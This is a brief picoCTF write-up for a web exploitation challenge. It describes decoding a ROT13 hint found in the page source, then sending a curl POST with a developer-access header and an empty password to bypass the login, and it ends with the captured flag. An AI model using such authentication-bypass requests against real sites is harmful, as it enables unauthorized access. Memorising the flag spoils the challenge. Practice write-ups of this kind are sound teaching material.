## Category
Web Exploitation

## Topic
Decoding and Page Inspection

## Vulnerability
The developer left a way to bypass the password in the codes.

## Exploit
You need to inspect the page, take the suspicious string and decode it using ROT13, to 
and you can use the curl command with the given header to send post request to the site

curl -X POST http://amiable-citadel.picoctf.net:57046/ \
-H "Content-Type: application/json" \
-H "X-Dev-Access: yes" \
-d '{"email":"ctf-player@picoctf.org", "password":""}'


=> picoCTF{brut4_f0rc4_125f752d}